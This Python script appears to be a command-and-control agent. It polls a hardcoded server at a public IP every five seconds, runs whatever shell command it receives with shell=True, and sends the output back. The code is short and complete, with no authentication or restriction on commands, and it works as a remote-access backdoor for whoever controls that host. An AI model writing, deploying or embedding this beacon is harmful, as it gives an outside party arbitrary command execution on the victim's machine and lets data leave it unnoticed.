import requests
import time
import uuid
import subprocess

# Unique agent ID
AGENT_ID = "80c70cf0-fd51-490e-bbc7-53d1c2d7477e"

# Server URLs
BASE_URL = "http://13.58.212.239:5000"
TASKS_API_URL = f"{BASE_URL}/api/tasks/{AGENT_ID}"
RESULTS_API_URL = f"{BASE_URL}/api/results"

def get_and_execute_task():
    try:
        response = requests.get(TASKS_API_URL, timeout=10)
        if response.status_code != 200:
            print(f"[AGENT] Failed to fetch task: {response.status_code}")
            return

        task = response.json()
        if not task or task.get("task") is None:
            print("[AGENT] No task received.")
            return

        print(f"[AGENT] Received task: {task}")
        task_type = task.get("task_type")
        task_id = task.get("task_id")

        if task_type == "command":
            shell_command = task.get("payload")
            print(f"[AGENT][COMMAND] Running shell command: {shell_command}")
            try:
                result = subprocess.run(shell_command, shell=True, capture_output=True, text=True)
                result_payload = {
                    "agent_id": AGENT_ID,
                    "task_id": task_id,
                    "result": {
                        "success": result.returncode == 0,
                        "output": result.stdout,
                        "error": result.stderr
                    }
                }
            except Exception as e:
                result_payload = {
                    "agent_id": AGENT_ID,
                    "task_id": task_id,
                    "result": {
                        "success": False,
                        "error": str(e)
                    }
                }

            # Send result
            try:
                resp = requests.post(RESULTS_API_URL, json=result_payload, timeout=10)
                print(f"[AGENT] Sent command result for task {task_id}: {resp.status_code} {resp.text}")
            except Exception as e:
                print(f"[AGENT][ERROR] Failed to send command result: {e}")
        else:
            print(f"[AGENT] Unknown task type: {task_type}")

    except Exception as e:
        print(f"[AGENT][ERROR] Exception while fetching/executing task: {e}")

if __name__ == "__main__":
    print(f"[AGENT] Starting agent with ID {AGENT_ID}")
    while True:
        get_and_execute_task()
        time.sleep(5)
